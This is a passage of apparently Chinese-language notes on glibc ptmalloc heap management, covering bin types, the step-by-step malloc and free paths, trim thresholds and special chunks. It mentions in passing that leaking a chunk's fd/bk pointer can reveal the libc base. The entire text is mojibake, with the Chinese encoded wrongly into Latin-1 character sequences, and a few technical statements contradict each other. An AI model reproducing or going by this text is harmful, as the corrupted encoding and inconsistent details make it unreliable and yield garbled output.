binçš„chunkï¼Œå¹¶ä¸”è¯¥chunkä¸å’Œtop chunkï¼ˆå³æœ€åˆåˆ†é…çš„å¾ˆå¤§çš„chunkï¼‰ç´§é‚»æ—¶ï¼Œè¯¥chunkä¼šè¢«é¦–å…ˆæ”¾åˆ°unsorted binä¸­ã€‚ è¡Œä¸ºï¼šå½“é‡Šæ”¾çš„å—è¾ƒå¤§ï¼Œæˆ–è€…æ¥è‡ª tcacheï¼ˆå½“ tcache æ»¡æ—¶ï¼‰ï¼Œä¼šå…ˆæ”¾åˆ°è¿™é‡Œã€‚åˆ†é…å™¨åœ¨æ‰¾ä¸åˆ°åˆé€‚å—æ—¶ï¼Œä¼šæ¥â€œæ•´ç†â€è¿™ä¸ªbinï¼ŒæŠŠé‡Œé¢çš„å—è¦ä¹ˆåˆ†é…å‡ºå»ï¼Œè¦ä¹ˆå½’å¹¶åˆ°æ­£ç¡®çš„ smallbin æˆ– largebin ä¸­ã€‚ Small_binï¼š(å…ˆè¿›å…ˆå‡º) ç‰¹ç‚¹ï¼šåŒå‘é“¾è¡¨ã€‚å­˜æ”¾ç¨å¤§ä¸€äº›çš„å°å†…å­˜å—,å¤§å°èŒƒå›´æ˜¯[0x20,0x400-0x10]ã€‚ æ¯ä¸ªbiné“¾çš„å¤´éƒ¨çš„fdå’Œarenaç›¸è¿ï¼Œæ¯ä¸ªbiné“¾çš„å°¾éƒ¨çš„bkå’Œarenaç›¸è¿ï¼Œè¿™é‡Œçš„arenaæŒ‡çš„æ˜¯å¯¹åº”çº¿ç¨‹çš„arenaï¼ˆmalloc_stateç»“æ„ä½“ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ‰“å°ä¸€ä¸ªåœ¨éfast biné“¾ä¸­çš„fd&#x2F;bkï¼Œå°±æœ‰å¯èƒ½çŸ¥é“libcçš„åŸºåœ°å€ã€‚ small binä¸­çš„æ¯ä¸ªchunkçš„å¤§å°ä¸å…¶æ‰€åœ¨çš„binçš„indexçš„å…³ç³»ä¸ºï¼šchunk_size&#x3D;2ï¼ŠSIZE_SZï¼Šindexã€‚ Largebinï¼š large binä¸­ä¸€å…±æœ‰63ä¸ªbinï¼Œæ¯ä¸ªbinä¸­çš„chunkå¤§å°ä¸ä¸€è‡´ï¼Œè€Œæ˜¯å¤„äºä¸€å®šçš„åŒºé—´èŒƒå›´å†…ã€‚è¿™63ä¸ªbinè¢«åˆ†æˆ6ç»„ï¼Œæ¯ä¸€ç»„binçš„chunkå¤§å°å…¬å·®ä¸€è‡´ï¼Œå…¶å¤§å°å’Œä¸‹æ ‡çš„å¯¹åº”å…³ç³» ä»¥64ä½ç³»ç»Ÿçš„large binä¸ºä¾‹è¿›è¡Œè¯´æ˜ã€‚ç¬¬ä¸€ä¸ªlarge binçš„èµ·å§‹chunkå¤§å°ä¸º1024å­—èŠ‚ï¼Œä½äºç¬¬ä¸€ç»„ï¼Œzè¿™ä¸ªç»„å†…æœ‰32ä¸ªäººæ§½ï¼Œç¬¬ä¸€ä¸ªæ§½å¯ä»¥å­˜å‚¨çš„chunkçš„å¤§å°èŒƒå›´ä¸º[1024,1024+64ï¼‰ï¼›ç¬¬äºŒä¸ªlarge binçš„èµ·å§‹chunkå¤§å°ä¸º1024+64ï¼Œä½äºç¬¬ä¸€ç»„ï¼Œè¯¥binå¯ä»¥å­˜å‚¨çš„chunkçš„å¤§å°èŒƒå›´ä¸º[1024+64,1024+64*2ï¼‰ã€‚ ç‰¹ç‚¹ï¼šåŒå‘é“¾è¡¨ã€‚ç”¨äºå­˜æ”¾å¤§çš„å†…å­˜å—ã€‚ è¡Œä¸ºï¼šä¸€ä¸ªé“¾è¡¨ä¸­å­˜æ”¾çš„æ˜¯ä¸€ä¸ªèŒƒå›´å†…çš„å—å¤§å°ï¼Œè€Œä¸æ˜¯å›ºå®šå¤§å°ã€‚è¿™äº›å—ä¼šæŒ‰å¤§å°æ’åºï¼Œä»¥ä¾¿å¿«é€Ÿæ‰¾åˆ°æœ€åˆé€‚çš„å—ã€‚ tcache&gt;fast_bin&gt;undorted_bin&gt;bin å†…å­˜åˆ†é…çš„æ­¥éª¤é”&gt;fast_bin&gt;small_bin å¦‚æœéƒ½ä¸ç¬¦åˆï¼Œéå†fast_binï¼ŒæŠŠç›¸é‚»çš„binè¿›è¡Œåˆå¹¶ï¼Œé“¾æ¥åˆ°unsorted_binä¸­ unsort_bin&gt;ç”³è¯·ï¼Œåˆ‡å‰²ï¼Œ&lt;ç›´æ¥æ”¾å…¥å¯¹åº”çš„biné“¾ è¿˜ä¸ç¬¦åˆå°±ä¼šåˆ°large_bin,ç„¶åæ˜¯top_chunk åˆ¤æ–­æ˜¯ä¸æ˜¯ä¸»åˆ†é…åŒºå»å¢åŠ top_chunkï¼Œæ˜¯ç”¨sbrk,ä¸æ˜¯ç”¨mmap(è¿™ä¸ªè¦åˆ¤æ–­æ˜¯ä¸æ˜¯åœ¨åˆ†é…é˜ˆå€¼å†…) åˆ†é…é˜ˆå€¼ä¼šæ˜ å°„ä¸€æ®µåŒºåŸŸè¿”å›ï¼Œ&lt;å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨malloc,ä¸»åˆ†é…åŒºåŸŸä¼šå…ˆåˆ†é…ä¸€å—ä½œä¸ºheapï¼Œä¸æ˜¯ç¬¬ä¸€æ¬¡å°±brk()å¢åŠ heapå¤§å°ï¼Œéä¸»åˆ†é…å»å°±åˆ‡å‡ºä¸€ä¸ªchunkæ¥è¿”å› é¦–å…ˆï¼Œç³»ç»Ÿä¼šè·å–æˆ‘ä»¬åˆ†é…åŒºçš„é”ï¼Œå¦‚æœæ‰¾åˆ°æ²¡æœ‰åŠ æ‰€çš„åˆ†é…åŒºï¼Œå°±å…ˆå¯¹æ”¹åˆ†é…åŒºä¸Šé”ï¼Œå¦‚æœæ‰€æœ‰éƒ½ä¸Šé”äº†ï¼Œå°±å¯ä»¥å¼€æ–°çš„åˆ†é…åŒºï¼Œæœ‰äº†è‡ªå·±çš„åˆ†é…åŒºå ç¬¬ 1 æ­¥ï¼šè½¬æ¢è¯·æ±‚å¤§å°ä¸å¯¹é½ åŠ¨ä½œï¼šmalloc(size) ä¸­çš„ size æ˜¯ç”¨æˆ·è¯·æ±‚çš„å­—èŠ‚æ•°ã€‚åˆ†é…å™¨ä¼šå°†å…¶è½¬æ¢ä¸ºå®é™…åˆ†é…çš„å†…å­˜å—å¤§å°ã€‚ è®¡ç®—ï¼šchunk_size = size + metadata_size + alignment_padding metadata_sizeï¼šåŒ…å«å­˜å‚¨å—å¤§å°ï¼ˆsizeï¼‰å’Œæ ‡å¿—ä½ï¼ˆå¦‚ P, M, Aï¼‰çš„ç©ºé—´ï¼Œé€šå¸¸ä¸º 2 * sizeof(size_t)ã€‚ alignment_paddingï¼šç¡®ä¿æœ€ç»ˆçš„å†…å­˜åœ°å€æ»¡è¶³å¯¹é½è¦æ±‚ï¼ˆä¾‹å¦‚ 64 ä½ç³»ç»Ÿä¸‹ 16 å­—èŠ‚å¯¹é½ï¼‰ã€‚ ç›®çš„ï¼šç¡®ä¿æ‰€æœ‰åˆ†é…çš„å†…å­˜éƒ½æ­£ç¡®å¯¹é½ï¼Œå¹¶ä¸”æœ‰ç©ºé—´å­˜æ”¾ç®¡ç†ä¿¡æ¯ã€‚ ç¬¬ 2 æ­¥ï¼šæ£€æŸ¥ Tcacheï¼ˆçº¿ç¨‹æœ¬åœ°ç¼“å­˜ï¼‰ æ¡ä»¶ï¼šå¦‚æœè¯·æ±‚çš„å¤§å°åœ¨ tcache æ”¯æŒçš„èŒƒå›´å†…ï¼ˆé€šå¸¸æ˜¯ 64 ä¸ªå¤§å°ç±»ï¼Œæ¯ä¸ªæœ€å¤§çº¦ 1032 å­—èŠ‚ï¼‰ã€‚ åŠ¨ä½œï¼š å®šä½åˆ°å½“å‰çº¿ç¨‹çš„ tcache ç»“æ„ã€‚ æ‰¾åˆ°å¯¹åº”å¤§å°ç±»çš„å•é“¾è¡¨ã€‚ å¦‚æœé“¾è¡¨éç©ºï¼šç›´æ¥ä»é“¾è¡¨å¤´éƒ¨å–å‡ºï¼ˆunlinkï¼‰ç¬¬ä¸€ä¸ª chunkï¼Œå°†å…¶åœ°å€è¿”å›ç»™ç”¨æˆ·ã€‚æ•´ä¸ªè¿‡ç¨‹å®Œå…¨æ— é”ï¼Œé€Ÿåº¦æå¿«ã€‚ å¦‚æœé“¾è¡¨ä¸ºç©ºï¼šç»§ç»­åç»­æ­¥éª¤ã€‚ä½†åœ¨ä»åç»­æ­¥éª¤è·å–åˆ°å—ä¹‹åï¼Œä¼šå°è¯•å¡«å…… tcacheã€‚ ç¬¬ 3 æ­¥ï¼šæ£€æŸ¥ Fastbin æ¡ä»¶ï¼šå¦‚æœè¯·æ±‚çš„å¤§å°å±äº fastbin èŒƒå›´ï¼ˆå°äºç­‰äº global_max_fastï¼Œé»˜è®¤ 128 å­—èŠ‚ï¼‰ã€‚ åŠ¨ä½œï¼š è·å– arena çš„é”ï¼ˆå› ä¸º fastbin æ˜¯å…¨å±€çš„ï¼Œéœ€è¦åŒæ­¥ï¼‰ã€‚ æ‰¾åˆ°å¯¹åº”å¤§å°ç±»çš„ fastbin å•é“¾è¡¨ï¼ˆLIFOï¼‰ã€‚ å¦‚æœé“¾è¡¨éç©ºï¼šå–å‡ºè¡¨å¤´çš„ chunkã€‚ Tcache Fillï¼šæ£€æŸ¥å½“å‰çº¿ç¨‹çš„ tcache å¯¹åº”é“¾è¡¨æ˜¯å¦è¿˜æœ‰ç©ºä½ï¼ˆé»˜è®¤æœ€å¤š7ä¸ªï¼‰ã€‚å¦‚æœæœ‰ï¼Œåˆ™å°è¯•ä» fastbin ä¸­å–å‡ºå¤šä¸ªå—ï¼ˆç›´åˆ°å–å®Œæˆ– tcache è¢«å¡«æ»¡ï¼‰æ”¾å…¥ tcacheï¼Œç„¶åè¿”å›æœ€åˆå–å‡ºçš„é‚£ä¸ªå—ã€‚ å¦‚æœé“¾è¡¨ä¸ºç©ºï¼šåˆ™ç»§ç»­åç»­æ­¥éª¤ã€‚ ç¬¬ 4 æ­¥ï¼šæ£€æŸ¥ Smallbin æ¡ä»¶ï¼šå¦‚æœè¯·æ±‚çš„å¤§å°å±äº smallbin èŒƒå›´ï¼ˆå°äº 1024 å­—èŠ‚ï¼‰ã€‚ åŠ¨ä½œï¼š æ‰¾åˆ°å¯¹åº”å¤§å°ç±»çš„ smallbin åŒå‘é“¾è¡¨ï¼ˆFIFOï¼Œæ¯ä¸ªbinä¸­çš„å—å¤§å°ä¸¥æ ¼ä¸€è‡´ï¼‰ã€‚ å¦‚æœé“¾è¡¨éç©ºï¼šå–å‡ºé“¾è¡¨å°¾éƒ¨çš„ä¸€ä¸ª chunkã€‚ Tcache Fillï¼šåŒæ ·ï¼Œå°è¯•ç”¨è¿™ä¸ªå¤§å°çš„å—å¡«å…… tcacheã€‚ å¦‚æœé“¾è¡¨ä¸ºç©ºï¼šåˆ™ç»§ç»­åç»­æ­¥éª¤ã€‚ ç¬¬ 5 æ­¥ï¼šæ ¸å¿ƒå¾ªç¯ - å¤„ç† Unsorted Bin è¿™æ˜¯æœ€å¤æ‚çš„ä¸€æ­¥ï¼Œæ˜¯åˆ†é…å™¨çš„â€œåƒåœ¾å¤„ç†å‚â€å’Œâ€œä¸­è½¬ç«™â€ã€‚ åŠ¨ä½œï¼š éå† unsorted binï¼šå®ƒæ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œå­˜æ”¾ç€æœ€è¿‘è¢«é‡Šæ”¾çš„ã€è¿˜æœªåˆ†ç±»çš„ chunkã€‚ æ£€æŸ¥æ¯ä¸€ä¸ª chunkï¼š ç²¾ç¡®åŒ¹é…ï¼Ÿ å¦‚æœé‡åˆ°ä¸€ä¸ª chunk çš„å¤§å°æ­£å¥½ç­‰äºè¯·æ±‚çš„å¤§å°ï¼Œåˆ™ç«‹å³å°†å…¶å–å‡ºå¹¶è¿”å›ã€‚ æ˜¯ Last Remainderï¼Ÿ å¦‚æœé‡åˆ° last remainder chunk ä¸”å®ƒçš„å¤§å°è¶³å¤Ÿå¤§ï¼Œåˆ™å¯¹å…¶è¿›è¡Œåˆ†å‰²ï¼šä¸€éƒ¨åˆ†è¿”å›ç»™ç”¨æˆ·ï¼Œå‰©ä½™éƒ¨åˆ†æˆä¸ºæ–°çš„ last remainderï¼ˆä¸€ç§ä¼˜åŒ–å±€éƒ¨æ€§çš„ç­–ç•¥ï¼‰ã€‚ ä¸åŒ¹é…åˆ™åˆ†ç±»ï¼šå¦‚æœå½“å‰ chunk æ—¢ä¸åŒ¹é…ä¹Ÿä¸é€‚åˆåˆ†å‰²ï¼Œå°±æ ¹æ®å…¶å¤§å°å°†å…¶ä» unsorted bin ä¸­å¸ä¸‹ï¼Œå¹¶é“¾å…¥å¯¹åº”çš„ smallbin æˆ– largebin ä¸­ã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸º â€œunsorted bin çš„æ¸…ç†â€ã€‚ è¿™ä¸ªå¾ªç¯ä¼šä¸€ç›´è¿›è¡Œï¼Œç›´åˆ°åˆ†é…åˆ°å—ï¼Œæˆ–è€… unsorted bin è¢«æ¸…ç©ºã€‚ ç¬¬ 6 æ­¥ï¼šæ£€æŸ¥ Largebin æ¡ä»¶ï¼šå¦‚æœè¯·æ±‚çš„å¤§å°å±äº largebin èŒƒå›´ï¼ˆå¤§äºç­‰äº 1024 å­—èŠ‚ï¼‰ã€‚ åŠ¨ä½œï¼šæ­¤æ—¶ unsorted bin å·²è¢«æ¸…ç©ºï¼Œåˆ†é…å™¨å¼€å§‹åœ¨å¯¹åº”çš„ largebin ä¸­æŸ¥æ‰¾ã€‚ largebin ä¸­çš„ chunk æŒ‰å¤§å°æ’åºã€‚ åˆ†é…å™¨ä½¿ç”¨â€œæœ€ä½³åŒ¹é…â€ç­–ç•¥ï¼Œå¯»æ‰¾ä¸€ä¸ªå¤§å°å¤§äºç­‰äºè¯·æ±‚å¤§å°çš„æœ€å° chunkã€‚ å¦‚æœæ‰¾åˆ°ï¼Œå°±è¿›è¡Œåˆ†å‰²ï¼šä¸€éƒ¨åˆ†è¿”å›ç»™ç”¨æˆ·ï¼Œå‰©ä½™éƒ¨åˆ†ä½œä¸ºæ–°çš„ç©ºé—²å—æ”¾å› unsorted binã€‚ ç¬¬ 7 æ­¥ï¼šä½¿ç”¨ Top Chunkï¼ˆæœ€åçš„æŒ£æ‰ï¼‰ å¦‚æœä»¥ä¸Šæ‰€æœ‰æ­¥éª¤éƒ½æ‰¾ä¸åˆ°åˆé€‚çš„ç©ºé—²å—ï¼Œåˆ†é…å™¨åªèƒ½æ±‚åŠ©äºæœ€åçš„å®¶åº•â€”â€”Top Chunkã€‚ æ£€æŸ¥ï¼šåˆ¤æ–­ top chunk çš„å¤§å°æ˜¯å¦è¶³å¤Ÿã€‚ è¡ŒåŠ¨ï¼š å¦‚æœè¶³å¤Ÿï¼šç›´æ¥ä» top chunk ä¸­åˆ‡å‰²å‡ºæ‰€éœ€çš„å¤§å°ï¼Œå‰©ä½™éƒ¨åˆ†å½¢æˆæ–°çš„ top chunkã€‚ å¦‚æœä¸è¶³ï¼š æ­¤æ—¶å°±è¦åˆ¤æ–­æ˜¯ä¸æ˜¯åœ¨ä¸»åˆ†é…åŒºäº†ï¼Œå¦‚æœåœ¨ä¸»åˆ†é…åŒºå°±è¦è°ƒç”¨sbrkï¼ˆï¼‰å»å¢å¤§top chunkï¼Œå¦‚æœåœ¨éä½åˆ†é…åŒºå°±è¦è°ƒç”¨mmapï¼ˆï¼‰æ¥å¢åŠ top chunkå¤§å°æˆ–è€…ç›´æ¥åˆ†é…ï¼Œè¿™é‡Œå¥½è¯åˆ¤æ–­æ˜¯å¦åœ¨mmapçš„åˆ†é…é˜ˆå€¼å†…ï¼Œå¤§äºå°±ä¼šæ˜ å°„ä¸€æ®µåŒºåŸŸè¿”å›ç»™ç”¨æˆ·ã€‚å°äºå°±è¦åˆ¤æ–­æ˜¯å¦æ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨malloc,æ˜¯ç¬¬ä¸€æ¬¡å°±å…ˆåˆ†é…ä¸€å—åŒºåŸŸä½œä¸ºæˆ‘ä»¬çš„heapï¼Œå¦‚æœåˆå§‹åŒ–è¿‡äº†ï¼Œä½åˆ†é…åŒºå°±brkï¼ˆï¼‰å¢åŠ heapçš„å¤§å°ï¼Œéä½åˆ†é…åŒºå°±æ—©top chunkä¸­åˆ‡å‡ºä¸€ä¸ªchunkè¿”å›ç»™ç”¨æˆ· å…ˆå°è¯•åˆå¹¶ fastbin ä¸­çš„å—ï¼ˆé€šè¿‡è°ƒç”¨ malloc_consolidateï¼‰æ¥æ‰©å…… top chunkã€‚ å¦‚æœè¿˜ä¸å¤Ÿï¼Œåˆ™è°ƒç”¨ sys_brk æˆ– sys_mmap å‘æ“ä½œç³»ç»Ÿç”³è¯·æ–°çš„å†…å­˜æ¥æ‰©å¤§ top chunkã€‚ ç„¶åå†ä»æ‰©å¤§åçš„ top chunk ä¸­è¿›è¡Œåˆ‡å‰²ã€‚ å†…å­˜å›æ”¶çš„æ­¥éª¤é”&gt; 1.è·å–åˆ†é…åŒºçš„é”ï¼Œä»¥æ­¤ä¿è¯çº¿ç¨‹å®‰å…¨ 2.åˆ¤æ–­ä¼ å…¥çš„æŒ‡é’ˆæ˜¯å¦ä¸º0ï¼Œå¦‚æœä¸º0å°±ç›´æ¥è¿”å›ä¼ å…¥ã€‚ free() å‡½æ•°çš„æŒ‡é’ˆæ˜¯ä¹‹å‰ç”± malloc()ã€calloc() æˆ– realloc() åˆ†é…çš„å†…å­˜å—çš„èµ·å§‹åœ°å€ã€‚è¿™ä¸ªæŒ‡é’ˆè‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒå‘Šè¯‰ free() å‡½æ•°éœ€è¦é‡Šæ”¾å“ªä¸€å—å†…å­˜ã€‚free() ä¼šåˆ©ç”¨è¿™ä¸ªåœ°å€ï¼Œä»¥åŠå­˜å‚¨åœ¨å†…å­˜å—å…ƒæ•°æ®ä¸­çš„ä¿¡æ¯ï¼Œæ¥ç¡®å®šè¦é‡Šæ”¾çš„å†…å­˜å—çš„å¤§å°ï¼Œç„¶åå°†å…¶å½’è¿˜ç»™å†…å­˜åˆ†é…å™¨ï¼ˆæˆ–å†…æ ¸ï¼‰ã€‚ 3.ä¸æ˜¯0çš„è¯å°±åˆ¤æ–­æ˜¯å¦ä¸ºmmapåˆ†é…çš„ï¼Œæ˜¯å°±è°ƒç”¨munmapæ¥é‡Šæ”¾ 4.åˆ¤æ–­å¤§å°ï¼Œå°äºmax_fast,ä½äºheapçš„é¡¶ç«¯å°±å’Œtop chunkåˆå¹¶ã€‚ä¸ä½äºheapçš„é¡¶ç«¯å°±æ”¾åœ¨fast_binä¸­ï¼Œå¹¶ä¸”ä¸æ”¹å˜pæ ‡å¿—ä½ 5.å¤§äºmax_fast,åˆ¤æ–­å‰ä¸€ä¸ªchunkæ˜¯å¦ç©ºé—²ï¼Œå¦‚æœæ˜¯freeçŠ¶æ€å°±æŠŠä»–ä»¬åˆå¹¶åœ¨ä¸€èµ·ï¼Œæ¥ç€åˆ¤æ–­æ˜¯å¦ä¸top_chunkç›¸é‚»ï¼Œç›¸é‚»å°±åˆå¹¶ 6.å¦‚æœä¸ä¸top_chunkåˆå¹¶ï¼Œå°±åˆ¤æ–­ä¸‹ä¸€ä¸ªchunkæ˜¯å¦ä¸ºç©ºé—²çš„ï¼Œæ˜¯å°±æŠŠä»–ä»¬åˆå¹¶æ”¾åœ¨unsorted binä¸­ï¼Œå¹¶æ›´æ–°åˆå¹¶åçš„chunkçš„å¤§å° 7.å¦‚æœåˆå¹¶åçš„å¤§å°&gt;FASTBIN_CONSOLIDATION_THRESHOLD çš„ï¼Œä¼šéå†fast_biné“¾ï¼Œå’Œç›¸é‚»chunkåˆå¹¶ï¼Œç„¶åé“¾å…¥unsorted_bin 8.æœ€ååˆ¤æ–­top_chunkæ˜¯å¦åœ¨mmapæ”¶ç¼©èŒƒå›´å†…,ä¸»å‡½æ•°ï¼šä¼šè¿”å›top chunkçš„ä¸€éƒ¨åˆ†ç»™ç³»ç»Ÿï¼Œä½†æ˜¯åˆå§‹å †å¤§å°ä¸ä¼šæ”¹å˜ï¼Œéä¸»åˆ†é…åŒº:æ”¶ç¼©sub_chunk,å§top_chunkè¿˜ç»™ç³»ç»Ÿ FASTBIN_CONSOLIDATION_THRESHOLD æ˜¯ä¸€ä¸ªåœ¨ glibc å†…å­˜åˆ†é…å™¨ï¼ˆptmallocï¼‰ä¸­ä½¿ç”¨çš„å†…éƒ¨é˜ˆå€¼ï¼Œç”¨äºå†³å®šä½•æ—¶è§¦å‘**fastbin çš„åˆå¹¶ï¼ˆconsolidationï¼‰**æ“ä½œã€‚æ­¤æ—¶æˆ‘ä»¬çš„chunkä¼šè¢«éå†å¹¶ä¸chunkåˆå¹¶ç„¶åé“¾å…¥æˆ‘ä»¬çš„unsortedbinä¸­ï¼Œæ­¤æ—¶fast_binä¼šç©º æ­¤æ—¶è¦åˆ¤æ–­æ˜¯å¦è¶…è¿‡è¿™ä¸ªé˜ˆå€¼ åˆ¤æ–­ top chunk çš„å¤§å°ï¼Œæ˜¯å¦å¤§äº mmap çš„æ”¶ç¼©é˜ˆå€¼ï¼ˆå³ M_TRIM_THRESHOLDï¼Œé€šå¸¸é»˜è®¤å€¼æ˜¯ 128KBï¼‰ ä¸»åˆ†é…åŒºï¼šå¦‚æœåˆå¹¶åçš„ top chunk ç¡®å®å¤§äºè¿™ä¸ªé˜ˆå€¼ï¼Œglibc ä¼šè°ƒç”¨ brk ç³»ç»Ÿè°ƒç”¨ï¼Œå°† top chunk æœ«å°¾å¤šä½™çš„éƒ¨åˆ†æ”¶ç¼©ï¼Œå¹¶å°†è¿™éƒ¨åˆ†å†…å­˜å½’è¿˜ç»™æ“ä½œç³»ç»Ÿã€‚ä¸»åˆ†é…åŒºæœ€åˆç”± brk æ‰©å±•è€Œæ¥ï¼Œè¿™éƒ¨åˆ†åˆå§‹å†…å­˜ï¼ˆé€šå¸¸æ˜¯ 128KB æˆ–æ›´å¤§ï¼‰æ˜¯ä¸ä¼šè¢«æ”¶ç¼©çš„ã€‚åªæœ‰åœ¨ç¨‹åºåç»­é€šè¿‡ sbrk è¿›ä¸€æ­¥æ‰©å±•çš„å †å†…å­˜ï¼Œæ‰å¯èƒ½è¢«æ”¶ç¼©å¹¶å½’è¿˜ã€‚è¿™æ˜¯ä¸€ç§ä¼˜åŒ–ï¼Œå› ä¸ºå®ƒé¿å…äº†é¢‘ç¹åœ°æ”¶ç¼©å’Œæ‰©å±•æœ€åˆçš„å †åŒºåŸŸ éä¸»åˆ†é…åŒºï¼šå½“éä¸»åˆ†é…åŒºçš„ top chunk åœ¨é‡Šæ”¾æ—¶å˜å¤§ï¼Œå¹¶ä¸”æ»¡è¶³æ”¶ç¼©æ¡ä»¶ï¼ˆå¤§äº M_TRIM_THRESHOLDï¼‰ï¼Œå®ƒä¼šå°† top chunk çš„ä¸€éƒ¨åˆ†æˆ–å…¨éƒ¨è¿˜ç»™æ“ä½œç³»ç»Ÿã€‚å¦‚æœä¸€ä¸ªçº¿ç¨‹é‡Šæ”¾äº†æ‰€æœ‰å®ƒè‡ªå·±åˆ†é…çš„å†…å­˜ï¼Œå¹¶ä¸”åˆå¹¶åçš„ top chunk åŒ…å«äº†æ•´ä¸ªéä¸»åˆ†é…åŒºçš„æ‰€æœ‰å†…å­˜ï¼Œé‚£ä¹ˆ glibc å°±ä¼šè°ƒç”¨ munmap ç³»ç»Ÿè°ƒç”¨ï¼Œå°†æ•´ä¸ª sub-heapï¼ˆä¹Ÿå°±æ˜¯è¿™ä¸ªçº¿ç¨‹çš„å †ï¼‰å½’è¿˜ç»™æ“ä½œç³»ç»Ÿã€‚è¿™ä½¿å¾—å…¶ä»–çº¿ç¨‹æˆ–è¿›ç¨‹å¯ä»¥ç«‹å³é‡ç”¨è¿™å—å†…å­˜ï¼Œæå¤§åœ°æé«˜äº†å¤šçº¿ç¨‹ç¯å¢ƒä¸‹çš„å†…å­˜å›æ”¶æ•ˆç‡ã€‚ ç‰¹æ®Šçš„chunkTop Chunkï¼ˆé¡¶çº§å— &#x2F; è’é‡å—ï¼‰Top Chunk æ˜¯ç³»ç»Ÿå·²ç»åˆ†é…ç»™å †ï¼ˆé€šè¿‡ brk æˆ– mmapï¼‰ä½†è¿˜æœªè¢« malloc åˆ†é…ç»™ç”¨æˆ·ç¨‹åºçš„é‚£éƒ¨åˆ†ç©ºé—´ã€‚Top Chunk æ˜¯å †ä¸­æ‰€æœ‰å·²åˆ†é…å’Œç©ºé—² chunk çš„â€œè¾¹ç•Œâ€å’Œâ€œæ‰©å±•åŸºåœ°â€ã€‚å®ƒä½äºå½“å‰å †åŒºçš„æœ€é«˜åœ°å€å¤„ã€‚(ä½åœ°å€) å®ƒæ˜¯å †ä¸Šæœ€åä¸€å—ä¹Ÿæ˜¯æœ€å¤§çš„ä¸€å—ç©ºé—² chunkã€‚ å®ƒä¸å±äºä»»ä½• binï¼ˆfastbin, smallbin, unsortedbin, largebinï¼‰ã€‚ å®ƒçš„ size å­—æ®µè®°å½•äº†å®ƒè‡ªèº«çš„å¤§å°ã€‚ å†…å­˜åˆ†é…çš„æœ€åæ‰‹æ®µï¼šå½“æ‰€æœ‰çš„ binï¼ˆåŒ…æ‹¬ unsortedbinï¼‰éƒ½æ— æ³•æ»¡è¶³ä¸€ä¸ªå†…å­˜åˆ†é…è¯·æ±‚æ—¶ï¼Œåˆ†é…å™¨å°±ä¼šä» Top Chunk ä¸­â€œåˆ‡å‰²â€å‡ºä¸€å—æ¥æ»¡è¶³è¯·æ±‚ã€‚ å¦‚æœ Top Chunk çš„å¤§å°è¶³å¤Ÿï¼šç›´æ¥ä»å…¶å¤´éƒ¨åˆ‡ä¸‹æ‰€éœ€å¤§å°çš„å†…å­˜ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†å½¢æˆæ–°çš„ã€æ›´å°çš„ Top Chunkã€‚ å¦‚æœ Top Chunk çš„å¤§å°ä¸è¶³ï¼šé€šè¿‡ brk() æˆ– mmap() ç³»ç»Ÿè°ƒç”¨å‘æ“ä½œç³»ç»Ÿç”³è¯·ï¼Œæ‰©å¤§ Top Chunk çš„å¤§å°ï¼Œç„¶åå†è¿›è¡Œåˆ‡å‰²ã€‚ å †çš„æ‰©å±•ä¸æ”¶ç¼©ï¼šTop Chunk æ˜¯å †ä¸æ“ä½œç³»ç»Ÿäº¤äº’çš„æ¥å£ã€‚å †é€šè¿‡è°ƒæ•´ Top Chunk çš„å¤§å°æ¥åŠ¨æ€å¢é•¿æˆ–ç¼©å°ã€‚ æ•´ä¸ª malloc æµç¨‹æ˜¯ä¸€ä¸ªç²¾å¦™çš„æ€§èƒ½ä¸èµ„æºåˆ©ç”¨ç‡ä¹‹é—´çš„æƒè¡¡ï¼š å¸¸è§è·¯å¾„ï¼ˆå¿«ï¼‰ï¼šsize convert -&gt; tcache -&gt; fastbin -&gt; return éå¸¸è§è·¯å¾„ï¼ˆæ…¢ä½†é«˜æ•ˆï¼‰ï¼šsmallbin -&gt; unsorted bin -&gt; largebin -&gt; return ä¿éšœè·¯å¾„ï¼ˆéå¸¸æ…¢ï¼‰ï¼šmalloc_consolidate -&gt; grow heap via syscall -&gt; top chunk -&gt; return**** Last Remainder Chunkï¼ˆæœ€åå‰©ä½™å—ï¼‰æ˜¯ unsorted bin ä¸­çš„ä¸€ä¸ªç‰¹æ®Šè§’è‰²ï¼Œå®ƒæ˜¯ä¸€ç§ä¼˜åŒ–ç­–ç•¥ï¼Œç”¨äºæ”¹å–„å†…å­˜å±€éƒ¨æ€§ã€‚ å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ å®ƒæ˜¯æœ€è¿‘ä¸€æ¬¡ä»ä¸€ä¸ªå¤§ chunk ä¸­åˆ†å‰²åå‰©ä½™ä¸‹æ¥çš„é‚£éƒ¨åˆ†ã€‚ å®ƒè¢«å•ç‹¬è®°å½•åœ¨ unsorted bin ä¸­ï¼Œå¹¶è¢«æ‰“ä¸Šâ€œç‰¹æ®Šâ€çš„æ ‡è®°ã€‚ å®ƒæœ‰ä»€ä¹ˆç”¨ï¼Ÿ åœºæ™¯ï¼šå‡è®¾ç¨‹åºå…ˆç”³è¯·äº†ä¸€å—å¤§å†…å­˜ï¼ˆAï¼‰ï¼Œç„¶ååˆç”³è¯·äº†ä¸€å°å—å†…å­˜ï¼ˆBï¼‰ï¼Œéšåé‡Šæ”¾äº† Aã€‚æ­¤æ—¶ï¼ŒA ä½œä¸ºä¸€ä¸ªå¤§ç©ºé—²å—åœ¨ unsorted bin ä¸­ã€‚æ¥ç€ï¼Œç¨‹åºåˆç”³è¯·ä¸€å—å’Œ B å¤§å°ç›¸åŒçš„å°å†…å­˜ã€‚ å¦‚æœæ²¡æœ‰ Last Remainderï¼šåˆ†é…å™¨å¯èƒ½ä¼šä» unsorted bin é‡Œéšä¾¿æ‰¾ä¸€å—åˆé€‚çš„å†…å­˜è¿›è¡Œåˆ‡å‰²ï¼Œè¿™å¯èƒ½å‘ç”Ÿåœ¨ä»»ä½•åœ°å€ã€‚ æœ‰äº† Last Remainderï¼šåˆ†é…å™¨ä¼šä¼˜å…ˆä»åˆšæ‰å‰©ä¸‹çš„é‚£ä¸ªå¤§å—ï¼ˆå³ Last Remainder Chunkï¼‰ä¸­è¿›è¡Œåˆ‡å‰²ã€‚å› ä¸ºåˆšåˆšä½¿ç”¨è¿‡çš„ B 